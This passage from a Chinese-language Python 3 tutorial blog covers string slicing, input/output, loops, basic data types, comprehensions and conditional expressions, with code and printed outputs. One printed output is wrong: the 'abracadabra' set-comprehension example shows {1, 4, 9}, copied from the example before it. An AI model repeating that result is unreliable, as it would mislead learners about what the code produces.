可以让反斜杠不发生转义。 如 r”this is a line with \n” 则 \n 会显示，并不是换行。</h3><h3 id="5-按字面意义级联字符串，如-“this-“-“is-“-“string”-会被自动转换为-this-is-string。"><a href="#5-按字面意义级联字符串，如-“this-“-“is-“-“string”-会被自动转换为-this-is-string。" class="headerlink" title="5.按字面意义级联字符串，如 “this “ “is “ “string” 会被自动转换为 this is string。"></a>5.按字面意义级联字符串，如 “this “ “is “ “string” 会被自动转换为 this is string。</h3><h3 id="6-字符串可以用-运算符连接在一起，用-运算符重复。"><a href="#6-字符串可以用-运算符连接在一起，用-运算符重复。" class="headerlink" title="6.字符串可以用 + 运算符连接在一起，用 * 运算符重复。"></a>6.字符串可以用 + 运算符连接在一起，用 * 运算符重复。</h3><h3 id="7-Python-中的字符串有两种索引方式，从左往右以-0-开始，从右往左以-1-开始。"><a href="#7-Python-中的字符串有两种索引方式，从左往右以-0-开始，从右往左以-1-开始。" class="headerlink" title="7.Python 中的字符串有两种索引方式，从左往右以 0 开始，从右往左以 -1 开始。"></a>7.Python 中的字符串有两种索引方式，从左往右以 0 开始，从右往左以 -1 开始。</h3><h3 id="8-Python-中的字符串不能改变。"><a href="#8-Python-中的字符串不能改变。" class="headerlink" title="8.Python 中的字符串不能改变。"></a>8.Python 中的字符串不能改变。</h3><h3 id="9-Python-没有单独的字符类型，一个字符就是长度为-1-的字符串。"><a href="#9-Python-没有单独的字符类型，一个字符就是长度为-1-的字符串。" class="headerlink" title="9.Python 没有单独的字符类型，一个字符就是长度为 1 的字符串。"></a>9.Python 没有单独的字符类型，一个字符就是长度为 1 的字符串。</h3><h3 id="10-字符串的截取的语法格式如下：变量-头下标-尾下标-步长"><a href="#10-字符串的截取的语法格式如下：变量-头下标-尾下标-步长" class="headerlink" title="10.字符串的截取的语法格式如下：变量[头下标:尾下标:步长]"></a>10.字符串的截取的语法格式如下：变量[头下标:尾下标:步长]</h3><p>实例:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">str = &#x27;123456789&#x27;</span><br><span class="line"></span><br><span class="line">print(str)  # 输出字符串</span><br><span class="line">print(str[0:-1])  # 输出第一个到倒数第二个的所有字符</span><br><span class="line">print(str[0:4])  # 输出第一个到第五个的所有字符（不包括第五个）</span><br><span class="line">print(str[3:])   # 如果后者不填默认为最后一个</span><br><span class="line">print(str[-3:-4])  # 如果前者大于等于后者，输出空</span><br><span class="line">print(str[0])  # 输出字符串第一个字符</span><br><span class="line">print(str[1:7:2])  # 输出从第二个开始到第八个且每隔一个的字符（步长为2）</span><br><span class="line">print(str[1:7:])  # 如果步长不填，默认为1</span><br><span class="line">print(str[1:7:100])  # 如果步长超出字符串长度，默认输出第一个</span><br><span class="line">print(str * 2)  # 输出字符串两次</span><br><span class="line">print(str + &#x27;你好&#x27;)  # 连接字符串</span><br><span class="line"></span><br><span class="line">print(&#x27;------------------------------&#x27;)</span><br><span class="line"></span><br><span class="line">print(&#x27;hello\nrunoob&#x27;)  # 使用反斜杠(\)+n转义特殊字符</span><br><span class="line">print(r&#x27;hello\nrunoob&#x27;)  # 在字符串前面添加一个 r，表示原始字符串，不会发生转义不会发生转义</span><br></pre></td></tr></table></figure><p>输出结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">123456789</span><br><span class="line">12345678</span><br><span class="line">1234</span><br><span class="line">456789</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">246</span><br><span class="line">234567</span><br><span class="line">2</span><br><span class="line">123456789123456789</span><br><span class="line">123456789你好</span><br><span class="line">------------------------------</span><br><span class="line">hello</span><br><span class="line">runoob</span><br><span class="line">hello\nrunoob</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="8-输入和输出"><a href="#8-输入和输出" class="headerlink" title="8. 输入和输出"></a>8. 输入和输出</h2><h3 id="1-输出"><a href="#1-输出" class="headerlink" title="1.输出"></a>1.输出</h3><p>在python中使用print()函数进行输出。<br><br><br>输出字符串时可用单引号或双引号括起来。<br><br><br>输出变量时，可不加引号。<br><br><br>变量与字符串同时输出或多个变量同时输出时，需用“,”隔开各项。</p><h3 id="2-输入"><a href="#2-输入" class="headerlink" title="2.输入"></a>2.输入</h3><p>Python提供了input()函数用于获取用户键盘输入的字符。<br><br><br>input()函数让程序暂停运行，等待用户输入数据，当获取用户输入后，Python将以<strong>字符串</strong>的形式存储在一个变量中，方便后面使用。<br><br><br>例如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = input(&quot;请输入第一个整数:&quot;) #输入变量a的值</span><br><span class="line">b = input(&quot;请输入第二个整数:&quot;) #输入变量b的值</span><br><span class="line">a = int(a)               #将变量a转换为整数型</span><br><span class="line">b = int(b)               #将变量b转换为整数型</span><br><span class="line">c = a + b                #两数相加赋给c</span><br><span class="line">print(&quot;两数之和为:&quot;,c)    #输出c的值</span><br></pre></td></tr></table></figure><p>输出结果为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">请输入第一个整数:2</span><br><span class="line">请输入第二个整数:3</span><br><span class="line">两数之和为: 5</span><br></pre></td></tr></table></figure><p>如果去掉上述第3，4行代码，也就是不用int()函数转换变量类型，那么变量c就是变量a和b的简单拼接。<br><br><br>例如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = input(&quot;请输入第一个整数:&quot;) #输入变量a的值</span><br><span class="line">b = input(&quot;请输入第二个整数:&quot;) #输入变量b的值</span><br><span class="line">c = a + b                #两数相加赋给c</span><br><span class="line">print(&quot;两数之和为:&quot;,c)    #输出c的值</span><br></pre></td></tr></table></figure><p>输出结果为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">请输入第一个整数:2</span><br><span class="line">请输入第二个整数:3</span><br><span class="line">两数之和为: 23</span><br></pre></td></tr></table></figure><h2 id="9-判断语句"><a href="#9-判断语句" class="headerlink" title="9. 判断语句"></a>9. 判断语句</h2><p>构造1:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if 判断条件:</span><br><span class="line">    语句块</span><br></pre></td></tr></table></figure><p>构造2:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if 判断条件1:</span><br><span class="line">    语句块1</span><br><span class="line">else:</span><br><span class="line">    语句块2</span><br></pre></td></tr></table></figure><p>构造3:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if 判断条件1:</span><br><span class="line">    语句块1</span><br><span class="line">elif 判断条件2:</span><br><span class="line">    语句块2</span><br><span class="line">...</span><br><span class="line">elif 判断条件n:</span><br><span class="line">    语句块n</span><br><span class="line">else:</span><br><span class="line">    语句块n+1</span><br></pre></td></tr></table></figure><h2 id="10-循环语句"><a href="#10-循环语句" class="headerlink" title="10. 循环语句"></a>10. 循环语句</h2><h3 id="1-while语句"><a href="#1-while语句" class="headerlink" title="(1).while语句"></a>(1).while语句</h3><p>构造:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">while 判断条件:</span><br><span class="line">    语句块</span><br></pre></td></tr></table></figure><h3 id="2-while-else语句"><a href="#2-while-else语句" class="headerlink" title="(2).while-else语句"></a>(2).while-else语句</h3><p>构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">while 判断条件:</span><br><span class="line">    语句块</span><br><span class="line">else:</span><br><span class="line">    语句块</span><br></pre></td></tr></table></figure><p>如果 while 后面的条件语句为 false 时，则执行 else 的语句块。<br>例如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">count = 0</span><br><span class="line">while count &lt; 5:</span><br><span class="line">   print (count, &quot; 小于 5&quot;)</span><br><span class="line">   count = count + 1</span><br><span class="line">else:</span><br><span class="line">   print (count, &quot; 大于或等于 5&quot;)</span><br></pre></td></tr></table></figure><p>执行结果为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0  小于 5</span><br><span class="line">1  小于 5</span><br><span class="line">2  小于 5</span><br><span class="line">3  小于 5</span><br><span class="line">4  小于 5</span><br><span class="line">5  大于或等于 5</span><br></pre></td></tr></table></figure><h3 id="3-for语句"><a href="#3-for语句" class="headerlink" title="(3).for语句"></a>(3).for语句</h3><p>构造:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for 变量 in 序列:</span><br><span class="line">    语句块</span><br></pre></td></tr></table></figure><p>for循环语句经常与range()函数一起使用，range()函数是Python的内置函数，可创建一个整数列表。<br><br><br>range()函数的语法是:<br><br><br>range([start,]stop[,step])<br><br><br>start:计数从start开始，默认是从0开始。例如，range(5)等价于range(0,5)<br><br><br>stop:计数到stop结束，但不包括stop。例如，range(0,5)是[0,1,2,3,4]<br><br><br>step:步长，默认为1。例如，range(0,5)等价于range(0,5,1)<br><br></p><h3 id="4-for-else语句"><a href="#4-for-else语句" class="headerlink" title="(4).for-else语句"></a>(4).for-else语句</h3><p>构造:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for 变量 in 序列:</span><br><span class="line">    语句块</span><br><span class="line">else:</span><br><span class="line">    语句块</span><br></pre></td></tr></table></figure><p>例如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for x in range(6):</span><br><span class="line">  print(x)</span><br><span class="line">else:</span><br><span class="line">  print(&quot;Finally finished!&quot;)</span><br></pre></td></tr></table></figure><p>输出结果:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">Finally finished!</span><br></pre></td></tr></table></figure><h2 id="11-Python基本数据类型-list-tuple-dict-set"><a href="#11-Python基本数据类型-list-tuple-dict-set" class="headerlink" title="11. Python基本数据类型-list-tuple-dict-set"></a>11. Python基本数据类型-list-tuple-dict-set</h2><p><img src="/img/python3%E8%AF%AD%E6%B3%95/python%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B.png" alt="title"></p><h3 id="1-列表list"><a href="#1-列表list" class="headerlink" title="(1).列表list"></a>(1).列表list</h3><p><img src="/img/python3%E8%AF%AD%E6%B3%95/%E5%88%97%E8%A1%A8%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C.png" alt="title"></p><h3 id="2-元组tuple"><a href="#2-元组tuple" class="headerlink" title="(2).元组tuple"></a>(2).元组tuple</h3><p>Python的元组与列表类似，不同之处在于元组的元素不能修改；<br><br><br>元组使用小括号()，列表使用方括号[]；<br><br><br>元组创建很简单，只需要在括号中添加元素，并使用逗号(,)隔开即可。</p><h3 id="3-字典dict"><a href="#3-字典dict" class="headerlink" title="(3).字典dict"></a>(3).字典dict</h3><p><img src="/img/python3%E8%AF%AD%E6%B3%95/%E5%AD%97%E5%85%B8%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C.png" alt="title"></p><h3 id="4-集合set"><a href="#4-集合set" class="headerlink" title="(4).集合set"></a>(4).集合set</h3><p><img src="/img/python3%E8%AF%AD%E6%B3%95/%E9%9B%86%E5%90%88%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C.png" alt="title"></p><h1 id="python3进阶语法"><a href="#python3进阶语法" class="headerlink" title="python3进阶语法"></a>python3进阶语法</h1><h2 id="1-推导式"><a href="#1-推导式" class="headerlink" title="1. 推导式"></a>1. 推导式</h2><p>Python 推导式是一种独特的数据处理方式，可以从一个数据序列构建另一个新的数据序列的结构体。<br><br><br>Python支持各种数据结构的推导式：</p><h3 id="1-列表-list-推导式"><a href="#1-列表-list-推导式" class="headerlink" title="(1).列表(list)推导式"></a>(1).列表(list)推导式</h3><p>列表推导式格式为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[表达式 for 变量 in 列表] </span><br><span class="line">[out_exp_res for out_exp in input_list]</span><br><span class="line"></span><br><span class="line">或者 </span><br><span class="line"></span><br><span class="line">[表达式 for 变量 in 列表 if 条件]</span><br><span class="line">[out_exp_res for out_exp in input_list if condition]</span><br></pre></td></tr></table></figure><p>out_exp_res：列表生成元素表达式，可以是有返回值的函数。<br><br><br>for out_exp in input_list：迭代 input_list 将 out_exp 传入到 out_exp_res 表达式中。<br><br><br>if condition：条件语句，可以过滤列表中不符合条件的值。<br><br></p><p>实例1:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">names = [&#x27;Bob&#x27;,&#x27;Tom&#x27;,&#x27;alice&#x27;,&#x27;Jerry&#x27;,&#x27;Wendy&#x27;,&#x27;Smith&#x27;]</span><br><span class="line">new_names = [name.upper() for name in names if len(name)&gt;3] # 过滤掉长度小于或等于3的字符串列表(if语句)，并将剩下的转换成大写字母返回(upper函数)到列表</span><br><span class="line">print(new_names) # 打印列表</span><br></pre></td></tr></table></figure><p>输出结果为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;ALICE&#x27;, &#x27;JERRY&#x27;, &#x27;WENDY&#x27;, &#x27;SMITH&#x27;]</span><br></pre></td></tr></table></figure><p>实例2:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = [i.__float__() for i in range(0,20) if i % 3 == 0]  # 计算0到20间可以被3整除的数,然后以float类型返回到列表</span><br><span class="line">print(a) # 打印列表</span><br></pre></td></tr></table></figure><p>输出结果为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[0.0, 3.0, 6.0, 9.0, 12.0, 15.0, 18.0]</span><br></pre></td></tr></table></figure><h3 id="2-字典-dict-推导式"><a href="#2-字典-dict-推导式" class="headerlink" title="(2).字典(dict)推导式"></a>(2).字典(dict)推导式</h3><p>字典推导基本格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123; key_expr: value_expr for value in collection &#125;</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">&#123; key_expr: value_expr for value in collection if condition &#125;</span><br></pre></td></tr></table></figure><p>实例1:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">listdemo = [&#x27;Google&#x27;,&#x27;baidu&#x27;, &#x27;tencent&#x27;]</span><br><span class="line"># 将列表中各字符串值为键，各字符串的长度为值，组成键值对 然后返回到newdict</span><br><span class="line">newdict = &#123;key:len(key) for key in listdemo&#125;</span><br><span class="line">print(newdict) # 打印该字典</span><br></pre></td></tr></table></figure><p>输出结果为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;Google&#x27;: 6, &#x27;baidu&#x27;: 5, &#x27;tencent&#x27;: 7&#125;</span><br></pre></td></tr></table></figure><p>实例2:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dic = &#123;x: x**2 for x in (2, 4, 6)&#125;</span><br><span class="line">print(dic)</span><br></pre></td></tr></table></figure><p>输出结果为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;2: 4, 4: 16, 6: 36&#125;</span><br></pre></td></tr></table></figure><h3 id="3-集合-set-推导式"><a href="#3-集合-set-推导式" class="headerlink" title="(3).集合(set)推导式"></a>(3).集合(set)推导式</h3><p>集合推导式基本格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123; expression for item in Sequence &#125;</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">&#123; expression for item in Sequence if conditional &#125;</span><br></pre></td></tr></table></figure><p>实例1:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setnew = &#123;i**2 for i in (1,2,3)&#125;  # 计算数字 1,2,3 的平方数</span><br><span class="line">print(setnew) </span><br></pre></td></tr></table></figure><p>输出结果为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;1, 4, 9&#125;</span><br></pre></td></tr></table></figure><p>实例2:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = &#123;x for x in &#x27;abracadabra&#x27; if x not in &#x27;abc&#x27;&#125; # 判断不是 abc 的字母并输出</span><br><span class="line">print(a)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出结果为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;1, 4, 9&#125;</span><br></pre></td></tr></table></figure><h3 id="4-元组-tuple-推导式"><a href="#4-元组-tuple-推导式" class="headerlink" title="(4).元组(tuple)推导式"></a>(4).元组(tuple)推导式</h3><p>元组推导式可以利用 range 区间、元组、列表、字典和集合等数据类型，快速生成一个满足指定需求的元组。<br><br><br>元组推导式基本格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(expression for item in Sequence )</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">(expression for item in Sequence if conditional )</span><br></pre></td></tr></table></figure><p>元组推导式和列表推导式的用法也完全相同，只是元组推导式是用 () 圆括号将各部分括起来，而列表推导式用的是中括号 []，另外元组推导式返回的结果是一个生成器对象。<br>实例:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = (x for x in range(1,10))</span><br><span class="line">print(a)</span><br><span class="line">b = tuple(a)</span><br><span class="line">print(b)</span><br></pre></td></tr></table></figure><p>输出结果为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;generator object &lt;genexpr&gt; at 0x00000299CE178350&gt;</span><br><span class="line">(1, 2, 3, 4, 5, 6, 7, 8, 9)</span><br></pre></td></tr></table></figure><h2 id="2-三元表达式"><a href="#2-三元表达式" class="headerlink" title="2. 三元表达式"></a>2. 三元表达式</h2><p>Python 中没有其它语言的三元表达式（三目运算符）相关说法，但是有类似的语法。<br><br>在 Python 中，三元表达式是一种语法结构，一般被 Python 开发者叫做条件表达式，它的结构如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">表达式（1）为 True 执行语句 if 条件表达式（1） else 表达式（1）为 False 执行语句</span><br></pre></td></tr></table></figure><p>实例1:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">age = 20</span><br><span class="line">cn = &quot;成年&quot; if age &gt;= 18 else &quot;未成年&quot;</span><br><span class="line">print(cn)</span><br></pre></td></tr></table></figure><p>输出结果为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">成年</span><br></pre></td></tr></table></figure><h3 id="1-返回多个条语句"><a href="#1-返回多个条语句" class="headerlink" title="(1).返回多个条语句"></a>(1).返回多个条语句</h3><p>实例2:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">age = 20</span><br><span class="line">cn = &quot;成年&quot;,&quot;大于18&quot; if age &gt;= 18 else &quot;未成年&quot;</span><br><span class="line">print(cn)</span><br></pre></td></tr></table></figure><p>输出结果为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&#x27;成年&#x27;, &#x27;大于18&#x27;)</span><br></pre></td></tr></table></figure><p>代码返回一个元组，内容为 (‘成年’, ‘大于18’) ，这里一定注意不要使用分号 ; 否则只返回第一个语句的结果。<br>实例3:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">age = 20</span><br><span class="line">cn = &quot;成年&quot;;&quot;大于18&quot; if age &gt;= 18 else &quot;未成年&quot;</span><br><span class="line">print(cn)</span><br></pre></td></tr></table></figure><p>输出结果为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">成年</span><br></pre></td></tr></table></figure><h3 id="2-三元表达式用于列表推导式"><a href="#2-三元表达式用于列表推导式" class="headerlink" title="(2).三元表达式用于列表推导式"></a>(2).三元表达式用于列表推导式</h3><p>实例4:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">li = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]</span><br><span class="line">ret = [i for i in li if i % 2 == 0]</span><br><span class="line">print(ret)</span><br><span class="line">ret = [i if i % 2 == 0 else None for i in li]</span><br><span class="line">print(ret)</span><br></pre></td></tr></table></figure><p>输出结果为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[2, 4, 6, 8, 10]</span><br><span class="line">[None, 2, None, 4, None, 6, None, 8, None, 10]</span><br></pre></td></tr></table></figure><h3 id="3-在函数内部使用三元表达式"><a href="#3-在函数内部使用三元表达式" class="headerlink" title="(3).在函数内部使用三元表达式"></a>(3).在函数内部使用三元表达式</h3><p>有些简单的判定逻辑，可以直接使用三元表达式简化，例如判断传入参数是否为偶数。<br>例如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def even_num(num):</span><br><span class="line">    return True if num % 2 == 0 else False</span><br></pre></td></tr></table></figure><h3 id="4-三元表达式与-lambda匿名函数"><a href="#4-三元表达式与-lambda匿名函数" class="headerlink" title="(4).三元表达式与 lambda匿名函数"></a>(4).三元表达式与 lambda匿名函数</h3><p>有时候可以将三元表达式与 lambda 进行结合，让代码变得更加简洁。<br>实例5:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">max = lambda a, b: a if a &gt; b else b  # 与下面的代码意思相同</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">def max(a, b):       </span><br><span class="line">    if a &gt; b:</span><br><span class="line">        ret = a</span><br><span class="line">    else:</span><br><span class="line">        ret = b</span><br><span class="line">    return ret</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">r = max(10, 15)</span><br><span class="line">print(r)</span><br></pre></td></tr></table></figure><p>输出结果为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">15</span><br></pre></td></tr></table></figure><h3 id="5-三元表达式的嵌套"><a href="#5-三元表达式的嵌套" class="headerlink" title="(5).三元表达式的嵌套"></a>(5).三元表达式的嵌套</h3><p>实例6:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 编写一个三元表达式，首先判断其值大于20，然后在判断是奇数</span><br><span class="line">num = 21</span><br><span class="line">ret = &quot;小于20&quot; if num &lt; 20 else (&quot;奇数&quot; if num % 2 == 1 else &quot;偶数&quot;)</span><br><span class="line">print(ret)</span><br></pre></td></tr></table></figure><p>输出结果为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">奇数</span><br></pre></td></tr></table></figure><h3 id="6-三元表达式的扩展使用"><a href="#6-三元表达式的扩展使用" class="headerlink" title="(6).三元表达式的扩展使用"></a>(6).三元表达式的扩展使用</h3><p>元组条件表达式</p><p>实例7:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">age = 20</span><br><span class="line">cn = (&quot;未成年&quot;, &quot;成年&quot;)[age &gt;= 18]</span><br><span class="line">print(cn)</span><br></pre></td></tr></table></figure><p>输出结果为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">成年</span><br></pre></td></tr></table></figure><p>语法格式如下所示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(当后面的表达式为假时返回，当后面的表达式为真时返回)[条件表达式]</span><br></pre></td></tr></table></figure><p>字典条件表达式</p><p>实例8:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">age = 20</span><br><span class="line">cn = &#123;False: &quot;未成年&quot;, True: &quot;成年&quot;&#125;[age &gt;= 18]</span><br><span class="line">print(cn)</span><br></pre></td></tr></table></figure><p>输出结果为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">成年</span><br></pre></td></tr></table></figure><p>上述两种写法都有一些<strong>故弄玄虚</strong>，而且<strong>代码非常不易阅读</strong>，<strong>所以不建议实战编码时使用</strong>。</p><h2 id="3-Python-断言"><a href="#3-Python-断言" class="headerlink" title="3.Python 断言"></a>3.Python 断言</h2><h3 id="1-python断言定义"><a href="#1-python断言定义" class="headerlink" title="(1).python断言定义"></a>(1).python断言定义</h3><p>Python断言用于判断某个表达式的值，结果为 